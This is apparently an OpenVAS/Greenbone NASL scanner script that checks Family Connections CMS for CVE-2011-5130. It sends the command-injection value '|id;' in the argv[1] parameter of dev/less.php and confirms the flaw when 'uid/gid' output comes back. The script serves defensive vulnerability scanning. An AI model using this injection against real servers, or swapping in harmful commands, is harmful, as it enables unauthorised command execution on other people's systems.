# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103356");
  script_cve_id("CVE-2011-5130");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Family Connections 'argv[1]' Parameter Remote Arbitrary Command Execution Vulnerability");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-12-06 10:40:05 +0100 (Tue, 06 Dec 2011)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("secpod_fcms_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("fcms/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50897");
  script_xref(name:"URL", value:"http://www.haudenschilt.com/fcms/index.html");
  script_xref(name:"URL", value:"http://sourceforge.net/apps/trac/fam-connections/ticket/407");

  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for more
  information.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary commands
  within the context of the vulnerable application.");

  script_tag(name:"summary", value:"Family Connections is prone to a remote arbitrary command-
  execution vulnerability because it fails to properly validate user-supplied input.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

CPE = "cpe:/a:haudenschilt:family_connections_cms";

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
if(dir == "/") dir = "";

# This will only work with the following php.ini requirements:
url = string(dir, "/dev/less.php?argv[1]=|id;");

if(http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
